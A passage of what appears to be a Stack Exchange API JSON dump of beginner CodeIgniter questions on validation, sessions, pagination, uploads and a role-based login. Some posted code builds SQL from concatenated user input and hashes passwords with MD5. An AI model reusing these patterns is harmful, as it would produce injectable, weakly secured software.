if the user is too young. I know it is calling the function correctly as I had some issues with the variables. Help?</p>\n\n<p>EDIT: Brendan's answer helped me a lot, but the main issue was a logic error. So here is how I have it working right now:</p>\n\n<pre><code>//Check if user is old enough\nfunction is_old_enough($input) {\n    $dob = $this-&gt;input-&gt;post('dob3').$this-&gt;input-&gt;post('dob1').$this-&gt;input-&gt;post('dob2');\n    $date = (date('Y')-13).date('md');\n    if ((int)$dob &gt; (int)$date) {\n        $this-&gt;form_validation-&gt;set_message('is_old_enough', 'You are not old enough to register on this site.');\n        return FALSE;\n    }\n    return TRUE;\n}\n\n\n$this-&gt;form_validation-&gt;set_rules('dob1', 'Date of Birth Month', 'trim|required|xss_clean|exact_length[2]');\n$this-&gt;form_validation-&gt;set_rules('dob2', 'Date of Birth Day', 'trim|required|xss_clean|exact_length[2]');\n$this-&gt;form_validation-&gt;set_rules('dob3', 'Date of Birth Year', 'trim|required|xss_clean|exact_length[4]|callback_is_old_enough[]');\n</code></pre>\n"},{"tags":["php","codeigniter","firebug"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12364775,"title":"Firebug destroying session variables in Codeigniter application","body":"<p>Well I m having strange problem here. I have a codeigniter 2 web application which requires user login. </p>\n\n<p>My session works perfectly when I jump from one page to another. But when I turn on Firebug and try to jump to another page, i m kicked back to login page. </p>\n\n<p>This happens always everytime I turn firebug on, but works okay if its not turned on. I have no clue whats going around. </p>\n\n<p>Why Codeigniter session is not working when Firebug is turned on?</p>\n\n<p>Any help will be highly appreciated.</p>\n\n<p><strong>Edit:</strong></p>\n\n<p>I have two separate applications made with Codeigniter. Both have same issue.</p>\n\n<p>P.S. I am facing this problem in my local machine, haven't checked in remote server.</p>\n\n<p>Thanks,\nSabin</p>\n"},{"tags":["php","codeigniter","session","cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12410629,"title":"Cookie based auth Logout not working","body":"<p>I am building a cookie based session mechanism which has an abstract class Session which can be extended to make multiple cookie session instances for varying use and complexity….</p>\n\n<p>I also have an Auth class which handles permissions and the actual logging in and out of the user. The Auth class requires a Session Class or child class of to run.</p>\n\n<p>Everything so far is great I can log a user in and also log them out if a certain amount of time has elapsed, ip address are not matching etc. </p>\n\n<p>Every page load reads the cookie checks for inconsistencies and destroys or updates it depending on xyz. The destroy scripts set the time on the cookie back to minus now and remove any user data that has been added from the auth library. This works as I have logged in waited a few minutes then hit refresh and the cookie gets frazzled and I get bounced back to the login screen.  </p>\n\n<p>However If I want to log them out via them clicking a button the destroy scripts do not work i.e. I can echo the original user data at the top the run the log out script which echoes logging out and runs all the functions with no errors etc  but then If I get the users cookie it is still the same. I fail to understand how this can work for the automated checks but not when a user hits the logout button…</p>\n\n<p>Below is my sessionDestroy function </p>\n\n<pre><code>protected function sessionDestroy($cookieName) {\n\n    setcookie(\n                $cookieName,\n                addslashes(serialize(array())),\n                (time() - 3600),\n                0\n        );          \n}\n</code></pre>\n\n<p>P.S  I know destroy is a bad word for cookies but you know what I mean…… Hopefully</p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12430380,"title":"CI creating multiple sessions","body":"<p>My CI application has been working fine.\nOn my localhost it works properly and on the live site, CI keeps generating sessions every time there is a page refresh.\nI've updated the sessions table on database to accommodate longer user_agents.\nWhat could be the cause of this?</p>\n"},{"tags":["php","ajax","codeigniter","jquery-ajax"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":60,"score":3,"question_id":12428905,"title":"How should an Ajax endpoint respond to a non-ajax request?","body":"<p>I am in the process of writing the backend  to respond to ajax queries. I am using Codeigniter, and my controller is made up of a bunch of these functions.</p>\n\n<pre><code>public function name_change()\n{\n    if($this-&gt;input-&gt;is_ajax_request())\n    {\n        //Grab the Inputs\n        //Do something\n        //Respond\n    }\n    else\n    {\n\n    }           \n}\n</code></pre>\n\n<p>my only question is how should i handle the case where it is not an Ajax request? There is no reason that these controller functions should be accessed by a non ajax request. The options that i can think of are.</p>\n\n<ul>\n<li>Send No Response</li>\n<li>throw up an error page (i assume i would use Status Code 200 or 403)</li>\n</ul>\n"},{"tags":["codeigniter","twitter-bootstrap","carousel","expressionengine"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":123,"score":2,"question_id":12396184,"title":"Expression Engine channel entries with Twitter Bootstrap Carousel Not working","body":"<p>Ok, so i'm having an issue implementing a basic Twitter bootstrap Carousel via ExpressionEngine's channel entries.  I think it has to do with the fact that you must designate the first li tag as \"active\" for bootstrap to know which image is presented upon page load.  But my code is as follows </p>\n\n<pre><code>&lt;div id=\"myCarousel\" class=\"carousel slide\"&gt;\n          &lt;!-- Carousel items --&gt;\n          &lt;div class=\"carousel-inner\"&gt;\n\n     {exp:channel:entries channel=\"work\" dynamic=\"no\"}\n       &lt;div class=\"item\"&gt;\n        &lt;div class=\"workItem\"&gt;\n          &lt;a href=\"{title_permalink='work/view'}\"&gt;{project_image wrap=\"image\"}&lt;/a&gt;\n          &lt;a href=\"{title_permalink='work/view'}\"&gt;&lt;h3&gt;{title}&lt;/h3&gt;&lt;/a&gt;\n        &lt;/div&gt;\n       &lt;/div&gt;\n     {/exp:channel:entries}\n\n           &lt;/div&gt;\n          &lt;!-- Carousel nav --&gt;\n          &lt;a class=\"carousel-control left\" href=\"#myCarousel\" data-slide=\"prev\"&gt;&amp;lsaquo;&lt;/a&gt;\n          &lt;a class=\"carousel-control right\" href=\"#myCarousel\" data-slide=\"next\"&gt;&amp;rsaquo;&lt;/a&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>So what seems to be happening is when the page loads no image shows up because i don't have an \"active\" class tagged since this code simply runs through all the 'projects' i've created in EE control panel using channel:entries.  Because the scroll arrows do show up and when i click on them it jumps to the first image and then i can scroll through the project images.  </p>\n\n<p>Is there a way to activate the first project (or most recent) as class=\"active\" so that it will be the default landing project.  Any help on this would be much appreciated...or if there is a better / easier way to do things let me know</p>\n\n<p>thanks a ton,</p>\n"},{"tags":["php","api","codeigniter","video","video-capture"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":117,"score":4,"question_id":12227009,"title":"How to get a embeded code for video","body":"<p>I am using <a href=\"http://embed.ly/\" rel=\"nofollow\">embedly</a>, it is working properly but the problem is for some video it gives error- <code>not a valid key</code>.I know we have to register on their site and pay some money for key but, I dont want to do that.Is there any other solution to get embed code for a video so that I can put on my code other than embedly.If yes please help me on this or if possible please provide some example to do this .The code for a key is given below.</p>\n\n<pre><code>$pro = new Embedly_API(array(\n    'key' =&gt; 'xxxxxxxxxxxxxxxx', //need a pro key for this\n    'user_agent' =&gt; 'Mozilla/5.0 (compatible; mytestapp/1.0)'\n));\n</code></pre>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php","email","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":246,"score":1,"question_id":8598583,"title":"Codeigniter e-mail special characters","body":"<p>I’m trying to send a e-mail with E-mail library using the SMTP protocol and special characters like áéíó. The problem is that the e-mail sends without this special characters even using the UTF-8 config.</p>\n\n<p>I’m using the Amazon SES.</p>\n\n<p>Look the code.</p>\n\n<pre><code>   //Libraries\n   $ci-&gt;load-&gt;library('email');\n  //Seta gMail\n  $config['protocol'] = \"smtp\";\n  $config['smtp_host'] = \"ssl://\";\n  $config['smtp_user'] = \"user\";\n  $config['smtp_pass'] = \"pass\";\n  $config['smtp_port'] = \"465\";\n  $config['smtp_timeout'] = 30;  \n  $config['charset'] = \"utf-8\";\n  $config['wordwrap'] = TRUE;\n  $config['validate'] = TRUE;\n  $config['mailtype'] = \"html\";\n  $config['newline'] = \"\\r\\n\";\n  $ci-&gt;email-&gt;initialize($config);\n  //Carrega o modelo do e-mail\n  $mensagem = $conteudo;\n  //Seta variáveis\n  $ci-&gt;email-&gt;from(\"cool@email.com\", $titulo);\n  $ci-&gt;email-&gt;reply_to('cool@email.com', 'New user');\n  $ci-&gt;email-&gt;set_alt_message($conteudo);\n  $ci-&gt;email-&gt;to($email_destino);\n  $ci-&gt;email-&gt;subject($titulo);\n  $ci-&gt;email-&gt;message($mensagem);\n  $ci-&gt;email-&gt;send();  \n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1297,"score":2,"question_id":5429386,"title":"Browser Cache issue in codeigniter","body":"<p>I am new in code igniter.I created a login form and a logout section. When i press the logout section, the page will redirect to login section. And when i click the back button in the browser it will show the previous pages.When i click the clear recent history and the choose cache,and then press the back button, it will not show the recent pages.It only shows the login section. How to overcome this?Please help me...</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12425069,"title":"Resize image in codeigniter","body":"<p>I want to resize an image while displaying it on form (100 * 100) in CodeIgniter, by using this function:</p>\n\n<pre><code>echo img('imagepath');\n</code></pre>\n"},{"tags":["php","codeigniter","redirect","controller","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":12416868,"title":"codeigniter redirect fails only when i include \"refresh\"","body":"<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass VerifyLogin extends CI_Controller\n{\n\n public function __construct()\n {\n    parent::__construct();\n    //Model for fetching users in database\n    $this-&gt;load-&gt;model('user', '', TRUE);\n }                             \n\n\n public function index()\n {\n    //Load method to help verify form credentials\n    $this-&gt;load-&gt;library('form_validation');\n\n    //-----------------------------------------------\n    //Verify Existance of values in login form fields\n    //-----------------------------------------------\n    //Validate existance of username field value\n    $this-&gt;form_validation-&gt;set_rules('username', 'Username', 'trim|required|xss_clean');\n    //Validate existance of password field value, and if exists then call 'check_database' func\n    $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'trim|required|xss_clean|callback_check_database');\n\n    //If the form validation is false (i.e. Missing form fields)\n    if($this-&gt;form_validation-&gt;run() == FALSE){\n            //Redirect back to login page\n            $this-&gt;load-&gt;view('general-Login');\n    }\n    //Login Success, goto main-page\n    else{\n        //Go to main page\n        redirect('Main', 'refresh');\n    }\n}\n\nfunction check_database($password)\n{\n    //Field validation succeeded.  Validate against database\n    $username = $this-&gt;input-&gt;post('username');\n\n    //Check the username and password against database\n    $result = $this-&gt;user-&gt;login($username, $password);\n\n    //If there is a result\n    if($result){\n        //will be used for session information\n        $sess_array = array();\n        foreach ($result as $row){\n            $sess_array= array(\n                'id' =&gt; $row-&gt;id,\n                'username' =&gt; $row-&gt;username\n            );\n            //Session set as logged in\n            $this-&gt;session-&gt;set_userdata('logged_in', $sess_array);\n        }\n        return true;\n    }\n    //No existance of user or, incorrect password\n    else{\n        //Send Message of incorrect username or password\n        $this-&gt;form_validation-&gt;set_message('check_database', 'Invalid Username or Password');\n        return false;\n    }\n}\n}\n</code></pre>\n\n<p>So i have a verifylogin controller that handles the form data from my login page. Database access works great and everything works perfectly until i get to the redirect feature. I try to redirect with refresh and it just gives me a page that says \"undefined\". Now it will suddenly work when i remove the 'refresh' and just leave the controller name, but i'm trying to figure out why this 'refresh' won't work. </p>\n\n<p>I've disabled my <code>.htaccess</code> \nI've tried setting my <code>$config['uri_protocol']</code> to <code>REQUEST_URI</code>, <code>AUTO</code>, and <code>PATH_INFO</code>\n  and had no luck.</p>\n\n<p>Also, this is my first submission online to anything like a forum so please....be gentle.</p>\n"},{"tags":["php","codeigniter","phpunit"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12294323,"title":"How CIunit supports HMVC","body":"<p>I am using HMVC in my codeigniter project because use it help to group my modules together so that code is better organized.</p>\n\n<p>When I integrate CIunit with codeigniter by following kenjis tutorials from <a href=\"http://d.hatena.ne.jp/Kenji_s/20120117/1326763908\" rel=\"nofollow\">How to use PHPUnit (CIUnit) with CodeIgniter 2.1.0</a>,  I got error when I try to run a test.</p>\n\n<p>I get the following error:</p>\n\n<pre><code>[CIUnit] PHP Error: Notice - Trying to get property of non-object File Path: MX/Loader.php (line: 48)\n\nPHP Fatal error:  Call to a member function fetch_module() on a non-object in E:\\xampp\\htdocs\\Project\\application\\third_party\\MX\\Loader.php on line 48\n</code></pre>\n\n<p>I read kenjis comments from <a href=\"https://bitbucket.org/kenjis/my-ciunit/issue/7/ciunit-hmvc\" rel=\"nofollow\">CIUnit + HMVC Issue</a>.</p>\n\n<p>However, he says it's \"ugly\", not \"impossible\" to integrate them. Has anyone done this integration and gotten CIUnit and HMVC to work together?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php","mysql","codeigniter","activerecord"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":10024051,"title":"how to add parantheses in a table JOIN , Active Records Codeigniter","body":"<p>hi i am using codeigniter active records , i want to create a talbe join </p>\n\n<p>this is my query </p>\n\n<pre><code>    $table = $this-&gt;mastables ['table1'];\n    $table1 = $this-&gt;mastables ['table2'];\n\n    $this-&gt;db-&gt;select ( 'a.RelationshipCategoryName,a.RelationshipCategoryID,COUNT( b.ShopRelationshipID ) AS count' );\n    $this-&gt;db-&gt;from ( $table . \" as a\" );\n    $this-&gt;db-&gt;join ( $table1 . \" as b\", \"(( a.RelationshipCategoryID=b.RecieverRelationshipCategory AND b.3rdPartyID=\" .$shop_id. \" ) OR (  a.RelationshipCategoryID=b.SenderRelationshipCategory AND b.ShopID=\" .$shop_id. \" )) AND b.IsDelete!=1\", 'left' );\n    $this-&gt;db-&gt;where ( 'a.ShopID', $shop_id );\n\n    $this-&gt;db-&gt;where ( 'a.IsActive', 1 );\n\n    if ($limit != NULL) {\n        $this-&gt;db-&gt;limit ( $limit, $offset );\n    }\n    if ($oderby != NULL &amp;&amp; $oder != NULL) {\n        $this-&gt;db-&gt;order_by ( $oderby, $oder );\n    }\n\n    $this-&gt;db-&gt;group_by ( 'a.RelationshipCategoryID' );\n\n    $query = $this-&gt;db-&gt;get ();\n    if ($query-&gt;num_rows () &gt; 0) {\n        return $query-&gt;result_array ();\n    } else {\n        return FALSE;\n    }\n</code></pre>\n\n<p>the error is </p>\n\n<pre><code>A Database Error Occurred\n\nError Number: 1064\n\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') OR ( a.RelationshipCategoryID=b.SenderRelationshipCategory AND b.ShopID=11 )) ' at line 3\n\nSELECT `a`.`RelationshipCategoryName`, `a`.`RelationshipCategoryID`, COUNT( b.ShopRelationshipID ) AS count FROM (`mas_shop_relationship_category` as a) LEFT JOIN `mas_shop_relationship` as b ON `a`.`RelationshipCategoryID`=`b`.`RecieverRelationshipCategory` AND b.3rdPartyID=11 ) OR ( a.RelationshipCategoryID=b.SenderRelationshipCategory AND b.ShopID=11 )) AND b.IsDelete!=1 WHERE `a`.`ShopID` = '11' AND `a`.`IsActive` = 1 GROUP BY `a`.`RelationshipCategoryID` ORDER BY `a`.`RelationshipCategoryName` asc LIMIT 5\n\nFilename: C:\\xampp\\htdocs\\elephanti2\\system\\database\\DB_driver.php\n\nLine Number: 330\n</code></pre>\n\n<p>the error is coming from this line </p>\n\n<pre><code>    $this-&gt;db-&gt;join ( $table1 . \" as b\", \"(( a.RelationshipCategoryID=b.RecieverRelationshipCategory AND b.3rdPartyID=\" .$shop_id. \" ) OR (  a.RelationshipCategoryID=b.SenderRelationshipCategory AND b.ShopID=\" .$shop_id. \" )) AND b.IsDelete!=1\", 'left' );\n</code></pre>\n\n<p>how to add this part of code correctly in my code </p>\n\n<pre><code>(( a.RelationshipCategoryID=b.RecieverRelationshipCategory AND b.3rdPartyID=\" .$shop_id. \" ) OR (  a.RelationshipCategoryID=b.SenderRelationshipCategory AND b.ShopID=\" .$shop_id. \" ))\n</code></pre>\n"},{"tags":["codeigniter","categories"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":33,"score":-1,"question_id":12423563,"title":"CodeIgniter Simple Edit Category Page","body":"<p>I have a list of categories with edit and delete buttons next to them, when I click the edit button I am redirected to an edit category page but now I just want to get the category name and echo it in the field so the user can edit it. Its so simple but im new to code igniter. I think i know how to get it its just returning it and echoing it in the view.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":5747,"score":2,"question_id":7503302,"title":"How to get base url in CodeIgniter 2.0.2","body":"<p>In config.php</p>\n\n<pre><code>$config['base_url'] = 'http://localhost/codeigniter/';\n</code></pre>\n\n<p>In View\n</p>\n\n<pre><code>&lt;link rel=\"stylesheet\" href=\"&lt;?php base_url(); ?&gt;css/default.css\" type=\"text/css\" /&gt;\n</code></pre>\n\n<p>\n<code>=&gt; Error: Call to undefined function base_url();</code> Help me</p>\n"},{"tags":["php","codeigniter","conditional"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12423142,"title":"Overuse of conditional statements?","body":"<p>I am encountering a small problem and I was just looking for some advice on best practices.</p>\n\n<p>I have a script that fetches some data from an external webpage. Sometimes this data is not complete.</p>\n\n<p>For example I may have</p>\n\n<pre><code>$array=array('name'=&gt;'Bob Smith','address'=&gt;array('0'=&gt;'My address'),'phone'=&gt;'000000');\n</code></pre>\n\n<p>I then set this data into another array to insert into my database.\nE.G.</p>\n\n<pre><code>$data=array('name'=&gt;$array['name'],'address'=&gt;$array['address']['0'],'phone'=&gt;$array['phone']);\n</code></pre>\n\n<p>If however for example no addresses were found, $array['address']['0'] is not set, thus creating a second array using it creates an error in CodeIgniter. Although in normal procedural coding no error would be shown, I assume CI has this error showing as resolving it is a best practice.</p>\n\n<p>So.. I assume the best way to resolve this is to use conditionals and check if $array['address']['0'] is set before adding it to our $data array. Is that correct?\nIf it is not, null is inserted into the database.</p>\n\n<p>The nest problem is when i get the data from the database to display it. \nI want to explode the lines of the address and output them, but if it is not set again codeigniter throws up an error. Again, easily avoided by having a conditional statement.</p>\n\n<p>My question is essentially within the processing, inserting and outputting of data where there are numerous variables which may or may not be set, i need to seemingly have loads and loads of conditional statements.</p>\n\n<p>I suppose in reality this is not a problem, but i like my code to be a short and succinct as possible. Have I missed something?</p>\n\n<p>CHeers</p>\n"},{"tags":["php","css","codeigniter","file-upload","mime-types"],"answer_count":1,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":128,"score":7,"question_id":12380232,"title":"I can't seem to upload css file types in codeigniter","body":"<p>I'm trying to upload a css file user codigniter's upload class.  Here is the controller:</p>\n\n<pre><code>public function uploadcssfile() \n{\n   $config['upload_path'] = './stylesheets/stores/'.$memberid.'/'; \n   $config['file_name'] = 'main.css';    \n   $config['allowed_types'] = 'css';   \n   $config['overwrite'] = true;   \n   $this-&gt;load-&gt;library('upload', $config);\n   if (! $this-&gt;upload-&gt;do_upload('filefieldname'))\n   {\n     die($this-&gt;upload-&gt;display_errors());\n   } \n}\n</code></pre>\n\n<p>I just want to upload a file of type css, yet codeigniter always gives this error:</p>\n\n<pre><code>The filetype you are attempting to upload is not allowed.\n</code></pre>\n"}]}
{"total":13987,"page":18,"pagesize":100,"questions":[{"tags":["php","mysql","codeigniter"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":90,"score":0,"question_id":8613987,"title":"Issue with sql query","body":"<p>I've two tables <code>sermons(sermon_id,preacher_id,sermon_name etc)</code> and <code>preachers(preacher_id,firstname,lastname etc)</code>. Now i display this like 1st preacher name then all the sermons of that preacher and so on , this is working properly. But want to display preachers who have sermons...</p>\n\n<p>following code is used but i got only the 1st preacher..</p>\n\n<pre><code>function viewAllpreachers($offset=0, $limit=null) {\n        $preacher_ids = array();\n        $this-&gt;db-&gt;distinct('preacher_id');\n        $this-&gt;db-&gt;select('preacher_id');\n        $this-&gt;db-&gt;from('sermons');\n\n        $query = $this-&gt;db-&gt;get();\n\n        if ($query-&gt;num_rows() &gt; 0) {\n\n            foreach ($query-&gt;result() as $key =&gt; $res1) {\n\n                $preacher = array();\n                $this-&gt;db-&gt;select('*');\n                $this-&gt;db-&gt;from('preacher');\n                $this-&gt;db-&gt;where('preacher_id', $res1-&gt;preacher_id);\n                $this-&gt;db-&gt;order_by('first_name');\n                $query = $this-&gt;db-&gt;get('', $limit, $offset);\n                if ($query-&gt;num_rows() &gt; 0) {\n\n                    foreach ($query-&gt;result() as $row) {\n                        $preacher[$row-&gt;preacher_id]['preacher_id'] = $row-&gt;preacher_id;\n                        $preacher[$row-&gt;preacher_id]['preacher_name'] = $row-&gt;first_name . ' ' . $row-&gt;last_name;\n                        $preacher[$row-&gt;preacher_id]['preacher_image'] = $row-&gt;preacher_image;\n                        $preacher[$row-&gt;preacher_id]['preacher_bio_brief'] = $row-&gt;preacher_bio_brief;\n\n                        $this-&gt;db-&gt;select('*');\n                        $this-&gt;db-&gt;from('sermons');\n                        $this-&gt;db-&gt;where('preacher_id', $row-&gt;preacher_id);\n                        $this-&gt;db-&gt;order_by('sort_order ');\n                        $sermon_array = array();\n\n                        $query = $this-&gt;db-&gt;get();\n                        if ($query-&gt;num_rows() &gt; 0) {\n                            foreach ($query-&gt;result() as $row1) {\n                                $sermon_array[$row1-&gt;sermon_id] ['sermon_image'] = $row1-&gt;sermon_image;\n                                $sermon_array[$row1-&gt;sermon_id] ['sermon_title'] = $row1-&gt;sermon_title;\n                                $sermon_array[$row1-&gt;sermon_id] ['audio_file'] = $row1-&gt;audio_file;\n                                $sermon_array[$row1-&gt;sermon_id] ['sermon_description'] = $row1-&gt;sermon_description;\n                            }\n                        }\n                        $preacher[$row-&gt;preacher_id]['sermon'] = $sermon_array;\n                    }\n                    return $preacher;\n                }\n            }  }\n        return false;\n    }\n</code></pre>\n"},{"tags":["codeigniter","codeigniter-url","codeigniter-routing"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":68,"score":-1,"question_id":12396723,"title":"Use same function for both 'add' and 'edit' in Codeigniter?","body":"<p>I want both these urls:</p>\n\n<p><strong>/admin/users/add</strong></p>\n\n<p>and</p>\n\n<p><strong>/admin/users/3/edit</strong></p>\n\n<p>to point to <code>edit($user_id = 0)</code> function in my users controller. The number 3 in the second url has to be passed to the <code>$user_id</code> parameter.</p>\n\n<p>How can I do this in a smooth way?</p>\n"},{"tags":["codeigniter","pagination"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":12416305,"title":"codeigniter pagination - results remain same on every page","body":"<p>I'm using the Codeigniter pagination, but am encountering an issue.</p>\n\n<p>The url changes on click, as in the limit updates e.g. displayAllUsers/10 to displayAllUsers/15, however the results remain same.</p>\n\n<p>Here is my controller:</p>\n\n<pre><code> public function displayAllUsers()\n    {\n\n        $this-&gt;load-&gt;model('backOfficeUsersModel');\n        $data['loggedUser'] = $this-&gt;backOfficeUsersModel-&gt;get_by('username', $this-&gt;session-&gt;userdata('username'), FALSE,TRUE);\n\n        $this-&gt;db-&gt;order_by('userid');\n        $limit = 5;     // this works, I have 5 records displayed on the page\n        $offset = 3;\n        $this-&gt;db-&gt;limit($limit);\n        $this-&gt;db-&gt;offset($offset);\n        $data['users'] = $this-&gt;backOfficeUsersModel-&gt;get();\n\n        // line bellow, prints correct result, 17 records total in database;\n        $totalresults = $this-&gt;db-&gt;get('back_office_users')-&gt;num_rows();\n\n\n        $this-&gt;load-&gt;library('pagination');\n        $config['base_url'] = site_url('/backOfficeUsers/displayAllUsers');\n        $config['total_rows'] = $totalresults;\n        $config['per_page'] = 5;\n        $config['uri_segment'] = 3;\n        $this-&gt;pagination-&gt;initialize($config); \n        $data['main_content'] = 'users';\n        $data['title'] = 'Back Office Users';\n        $errorMessage = FALSE;\n        $this-&gt;load-&gt;vars($data,$errorMessage);\n        $this-&gt;load-&gt;view('backOffice/template');\n\n    } // end of function displayAllUsers\n</code></pre>\n\n<p>Anyone can spot what I am doing wrong? </p>\n"},{"tags":["php","codeigniter","phpmyadmin"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":120,"score":1,"question_id":12417644,"title":"Code Igniter login user role","body":"<p>I've made the correct database configuration, the view_login, and also i've inserted some data into ms_user table. and now, how do i create login with role such as\nusername, password, role ('student' 'teacher' 'headmaster'). </p>\n\n<p>i found <a href=\"http://www.codefactorycr.com/login-with-codeigniter-php.html\" rel=\"nofollow\">this</a> to guide me, but the site only provide with 2 information login, username and password. where do i add the third 'role' information ?</p>\n\n<p>This is view_login.php</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;  &lt;title&gt;Selamat datang pada QB Project &lt;/title&gt;&lt;/head&gt;\n\n&lt;script&gt;\n    function loginsukses()\n    {\n            alert('Login Success');\n    }\n&lt;/script&gt;\n\n&lt;body&gt;\n&lt;center&gt;&lt;h1&gt;Selamat datang pada QB Architecture&lt;/h1&gt;&lt;/center&gt;\n&lt;div id=\"form\"&gt;\n        &lt;form method=\"POST\" action=\"\"&gt;\n        &lt;table border=\"1\" bordercolor=\"gold\" style=\"background-color:#FFFFFF\" width=\"20%\" cellpadding=\"2\" cellspacing=\"4\"&gt;\n        &lt;tr&gt;\n            &lt;td class=\"td\"&gt;Username&lt;/td&gt;\n            &lt;td&gt;\n            &lt;input type=\"text\" id =\"username\" name =\"username\" class=\"gui\" \" /&gt;\n\n            &lt;/td&gt;\n\n        &lt;/tr&gt;\n\n        &lt;tr&gt;\n            &lt;td class=\"td\"&gt;Password&lt;/td&gt;\n            &lt;td class=\"td\"&gt;&lt;input type=\"password\" id=\"password\" name=\"password\" class=\"gui\" /&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n\n        &lt;tr&gt;\n            &lt;td class=\"td\"&gt;Jabatan&lt;/td&gt;\n            &lt;td class=\"td\"&gt;&lt;select name=\"jabatan\" id=\"Jabatan\" class=\"gui\"&gt;\n            &lt;option value=“Accounting”&gt;Accounting&lt;/option&gt;\n            &lt;option value=“Direktur”&gt;Direktur&lt;/option&gt;\n            &lt;option value=”HeadDivisi”&gt;Head Divisi&lt;/option&gt;\n            &lt;/select&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td&gt;&lt;/td&gt;\n            &lt;td class=\"td\"&gt;\n            &lt;input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" onclick=\"loginsukses()\" /&gt;          \n            &lt;/td&gt;\n        &lt;/tr&gt;\n\n    &lt;/form&gt;\n&lt;/div&gt;\n\n\n\n&lt;/body&gt;\n &lt;/html&gt;\n</code></pre>\n\n<p>this is Login function at model folder</p>\n\n<pre><code>&lt;?php\n\nClass Login extends CI_Model\n {\n function login($username, $password)\n {\n   $this -&gt; db -&gt; select('username, password, jabatan');\n   $this -&gt; db -&gt; from('ms_user');\n   $this -&gt; db -&gt; where('username = ' . \"'\" . $username . \"'\");\n   $this -&gt; db -&gt; where('password = ' . \"'\" . MD5($password) . \"'\");\n   $this -&gt; db -&gt; where('jabatan = ' . \"'\" . $jabatan . \"'\");\n   $this -&gt; db -&gt; limit(1);\n\n   $query = $this -&gt; db -&gt; get();\n\n   if($query -&gt; num_rows() == 1)\n   {\n     return $query-&gt;result();\n   }\n   else\n   {\n     return false;\n   }\n }\n}\n?&gt;\n</code></pre>\n\n<p>and this is validate_login function at controller folder</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass ValidateLogin extends CI_Controller {\n\n function __construct()\n {\n   parent::__construct();\n   $this-&gt;load-&gt;model('Login','',TRUE);\n }\n\n function index()\n {\n   //This method will have the credentials validation\n   $this-&gt;load-&gt;library('form_validation');\n\n   $this-&gt;form_validation-&gt;set_rules('username', 'Username', 'trim|required|xss_clean');\n   $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'trim|required|xss_clean|callback_check_database');\n   $this-&gt;form_validation-&gt;set_rules('Jabatan', 'Username', rim|required|xss_clean');\n\n   if($this-&gt;form_validation-&gt;run() == FALSE)\n   {\n     //Field validation failed.  User redirected to login page\n     $this-&gt;load-&gt;view('login_view');\n   }\n   else\n   {\n     //Go to private area\n     redirect('qb_main', 'refresh');\n   }\n\n }\n\n function check_database($password)\n {\n   //Field validation succeeded.  Validate against database\n   $username = $this-&gt;input-&gt;post('username');\n\n   //query the database\n   $result = $this-&gt;user-&gt;login($username, $password, $jabatan);\n\n   if($result)\n   {\n     $sess_array = array();\n     foreach($result as $row)\n     {\n       $sess_array = array(\n         'id' =&gt; $row-&gt;id,\n         'username' =&gt; $row-&gt;username\n       );\n       $this-&gt;session-&gt;set_userdata('logged_in', $sess_array);\n     }\n     return TRUE;\n   }\n   else\n   {\n     $this-&gt;form_validation-&gt;set_message('check_database', 'Invalid username or password');\n     return false;\n   }\n }\n}\n?&gt;\n</code></pre>\n\n<p>i'm very new to this framework, so i don't understand what i wrote above, but i'm willingly to learn, please help me</p>\n"},{"tags":["php","javascript","jquery","html","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12418647,"title":"jquery/mysql insertion error","body":"<p>As you may gather from the code below I am trying to get a profile updater script working. I seem to be running into problems though. I am getting the 'hello' alert when the script finishes processing but it seems as if the jquery is not properly grabbing the values from the textboxes because my mysql table is returning nothing inserted. any ideas? below is my code and screenshots:</p>\n\n<p><img src=\"http://i.stack.imgur.com/GwAvB.png\" alt=\"enter image description here\"></p>\n\n<p>Frontend 